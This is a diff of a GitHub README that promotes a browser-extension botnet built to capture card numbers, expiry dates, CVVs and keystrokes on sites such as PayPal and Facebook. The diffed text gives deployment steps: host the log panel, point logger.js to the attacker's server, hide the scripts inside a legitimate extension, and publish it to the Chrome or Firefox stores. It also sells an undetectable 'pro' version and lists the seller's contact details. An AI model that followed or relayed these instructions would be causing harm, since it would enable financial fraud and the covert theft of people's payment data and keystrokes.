@@ -1,60 +1,92 @@
 # botnet-browser-chrome
 botnet browser chrome,mozilla firefox,capture card number any web site ,paypal,facebook,e-commerce ,get card number,expiration date, CVV ,pro version 
 
-# Help 
+# Screenshot (older panel )
 ![1](https://user-images.githubusercontent.com/30985149/76715397-24141180-6724-11ea-8623-21d963a81c92.png)
 
 ![2](https://user-images.githubusercontent.com/30985149/76715402-28d8c580-6724-11ea-977b-cccdb0b1e8b3.png)
 
-# new version PHP
+
 
 ![card-bot](https://user-images.githubusercontent.com/30985149/76715424-3f7f1c80-6724-11ea-835a-773edb2b24f0.jpg)
 
-# Demo test login
 
 ![3](https://user-images.githubusercontent.com/30985149/76715434-49a11b00-6724-11ea-813c-5d631e36ed9f.jpg)
 
-# what do you need ? 
+# New Panel ( version 3)
 
--web server for exemple hosgator, or free hosting (00webhost ) or wampserver or xhampp ... to test your extension
-
--publish your extension in  chrome web store or adon mozilla 
-
-# how it works ?
-1) open "km.js"
-
-change http://1127.0.0.1     to your web server 
-
-2) send folder named " server "   to your web server , test with wampserver or xhampp ......etc
-
-3) take a legitimate extension then add  "km.js","jquery-3.1.1", if you have questions how does it work ask me in comment
-
-4) publish your extension one chrome web store or adon mozilla
-
-# waring !!!!!!!
-Version pro to bypass mozilla firefox or chrome web store ,Contact me because this version was shared by many people and it is not fud
-https://shoppy.gg/@hakanonymos
-
-##################################################
-
-Email : hakanonymos@hotmail.com
-
-whatsapp +1 315 636 6596  ( I speak French /English )
-
-Instagram : https://www.instagram.com/hakanonymos
-
-#######################################################
-
-# demo video Youtub (update video )
-
-https://www.youtube.com/watch?v=ljZsw3bRxPY&t=1s
-
-# New version beautiful design
-
-![keystroks](https://user-images.githubusercontent.com/30985149/80127532-fc666380-8583-11ea-9fbd-5a086499e628.jpeg)
+https://github.com/hakanonymos/botnet-browser-chrome-firefox-V3
 
 
-https://github.com/hakanonymos/botnet-browser-chrome-firefox-V2
+# Screenshot (2020 )
+![keylog](https://user-images.githubusercontent.com/30985149/92989181-3354fb80-f4ca-11ea-94ed-e5873fc21811.JPG)
+
+
+
+![WhatsApp Image 2020-05-06 at 09 56 37](https://user-images.githubusercontent.com/30985149/81164786-72090100-8f80-11ea-9aaf-2dfe901abcca.jpeg)
+
+
+![WhatsApp Image 2020-04-29 at 18 16 32](https://user-images.githubusercontent.com/30985149/81166239-ec3a8500-8f82-11ea-951f-32392a168dbc.jpeg)
+
+open log without redirect , remove log very simple (new panel )
+
+![file2](https://user-images.githubusercontent.com/30985149/92989185-3b14a000-f4ca-11ea-8637-368880ff07ac.JPG)
+
+# Installation Server
+
+Start your wampserver,xamp ....etc and send the "panel" file to your server
++ panel
+1. `config.php`
+
+usernam  = admin
+
+password = admin
+
+2. `log1.php` 
+
+
+If you want : SET YOUR DATETIMEZONE HERE :
+
+`$date = new DateTime("now", new DateTimeZone('Africa/Dakar') );`
+
+you can use Europe/Paris or America/New_York	 
+if you want to change DATETIMEZONE clique here https://www.php.net/manual/en/timezones.php
+
+
+# Configuration Extension 
+
+inject javascript code into web browser of victime or use extension chrome or mozilla firefox
+
+Open the extension folder ,js/
++ logger.js
+put the name of your website for exemple `http://127.0.0.1/server/ 
+and save changes
+
++ `background.js`
+change "url" redirect after install extension
+
+# Installation Extension Chrome / Mozilla Firefox
++ Chrome
+1. Open Chrome browser and navigate to `chrome://extensions`
+2. Select "Developer Mode" and then click "Load unpacked extension...
+3. load folder extension
+
++ Mozilla Firefox
+1. Open Firefox browser and navigate to `about:debugging`
+2. Click "Load Temporary Add-on"  
+3. click `manifest.json`
+
+ to upload extension in mozilla firefox or chrome web store you need a new version fud 
+or some technique .
+
+version pro can found here https://shoppy.gg/product/5d9ifM3
+
+# Contact 
+
+hakanonymos@hotmail.com
+
+Whatsapp: +1 315 63 66 596
+
 
   
 
